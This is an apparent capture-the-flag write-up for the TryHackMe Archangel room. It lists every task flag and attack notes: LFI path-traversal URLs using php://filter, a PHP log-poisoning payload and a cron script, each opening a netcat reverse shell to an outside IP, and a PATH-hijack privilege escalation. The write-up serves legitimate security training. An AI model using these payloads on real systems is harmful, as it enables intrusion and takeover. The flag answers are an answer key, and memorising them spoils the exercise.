#TryHackMe Archangel

# Saikat Karmakar | Feb 5:2021

-------------------------------------------------------------------------------

# Task 2
1. Find a different hostname
```
mafialive.thm
```
2. Find flag 1
```
thm{f0und_th3_r1ght_h0st_n4m3}
```
3. Look for a page under development
```
test.php
```
4. Find flag 2
```
thm{explo1t1ng_lf1}
```
5. Get a shell and find the user flag
```
thm{lf1_t0_rc3_1s_tr1cky}
```

# Task 3
1. Get User 2 flag 
```
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```
2. Root the machine and find the root flag
```
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```

===============================================================================
--
-----------
***Notes***
-----------

LFI php filter bypass
https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter

http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php


http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/.././.././.././log/apache2/access.log

http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/.././.././.././../home/archangel


<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.23.120 9999 >/tmp/f') ?>


echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.4.23.120 1234 > /tmp/f" > helloworld.sh

==========================================================================
**Steps**
-------------------------------------------------------------------------------
echo '/bin/bash -p' > cp
chmod 777 cp
ls -la | grep cp
export PATH=/tmp:$PATH //bcz cp is in tmp folder 
echo $PATH
-------------------------------------------------------------------------------